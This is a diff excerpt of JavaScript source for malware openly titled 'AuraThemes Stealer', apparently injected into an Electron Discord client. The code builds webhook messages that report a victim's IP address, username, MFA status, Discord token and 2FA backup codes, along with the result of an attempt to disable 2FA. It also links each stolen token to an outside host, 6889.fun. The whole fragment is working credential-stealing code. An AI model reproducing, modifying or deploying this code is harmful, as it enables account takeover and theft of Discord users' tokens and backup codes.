+            { name: "IP", value: `\`${ip}\``, inline: false, },
+            { name: "Username", value: `\`${user.username}#${user.discriminator}\``, inline: false, },
+            { name: "Language", value: GetLangue(user.locale), inline: false, },
+            { name: "A2F", value: GetA2F(user.mfa_enabled), inline: false, },
+            { name: "Badges", value: GetBadges(user.flags), inline: false, },
+            { name: "TOKEN", value: `\`\`\`${token}\`\`\`\n[Copy Token](https://6889.fun/api/aurathemes/raw?data=${token})\n\n[Download Banner](${userBanner})`, inline: !1, },
           ],
-
           thumbnail: userAvatar,
         });
         await post(params);
@@ -2560,55 +2172,15 @@ electron.session.defaultSession.webRequest.onCompleted(
           title: "AuraThemes Stealer User 2FA Codes",
           color: config["embed-color"],
           fields: [
-            {
-              name: "AuraThemes Files",
-              value: `[Gofile](${config.transfer_link})`,
-              inline: false,
-            },
-            {
-              name: "IP",
-              value: "`" + ip + "`",
-              inline: false,
-            },
-            {
-              name: "Username",
-              value: `\`${user.username}#${user.discriminator}\``,
-              inline: false,
-            },
-            {
-              name: "Language",
-              value: GetLangue(user.locale),
-              inline: false,
-            },
-            {
-              name: "A2F",
-              value: GetA2F(user.mfa_enabled),
-              inline: false,
-            },
-            {
-              name: "Badges",
-              value: GetBadges(user.flags),
-              inline: false,
-            },
-            {
-              name: "2FA disabler Response",
-              value: `\`\`\`md\n- ${
-                validCodeFound ? "Disabled" : "Cannot Disable"
-              }\`\`\``,
-              inline: false,
-            },
-            {
-              name: "Backup Codes",
-              value: `\`\`\`md\n${backup_code
-                .map((x) => `- ${x}`)
-                .join("\n")}\`\`\``,
-              inline: false,
-            },
-            {
-              name: "TOKEN",
-              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://raw.6889.fun/api/aurathemes/raw/t/${token})\n\n[Download Banner](${userBanner})`,
-              inline: !1,
-            },
+            { name: "AuraThemes Files", value: `[Gofile](${config.transfer_link})`, inline: false, },
+            { name: "IP", value: "`" + ip + "`", inline: false, },
+            { name: "Username", value: `\`${user.username}#${user.discriminator}\``, inline: false, },
+            { name: "Language", value: GetLangue(user.locale), inline: false, },
+            { name: "A2F", value: GetA2F(user.mfa_enabled), inline: false, },
+            { name: "Badges", value: GetBadges(user.flags), inline: false, },
+            { name: "2FA disabler Response", value: `\`\`\`md\n- ${ validCodeFound ? "Disabled" : "Cannot Disable" }\`\`\``, inline: false, },
+            { name: "Backup Codes", value: `\`\`\`md\n${backup_code.map((x) => `- ${x}`).join("\n")}\`\`\``, inline: false, },
+            { name: "TOKEN", value: `\`\`\`${token}\`\`\`\n[Copy Token](https://6889.fun/api/aurathemes/raw?data=${token})\n\n[Download Banner](${userBanner})`, inline: !1, },
           ],
 
           thumbnail: userAvatar,
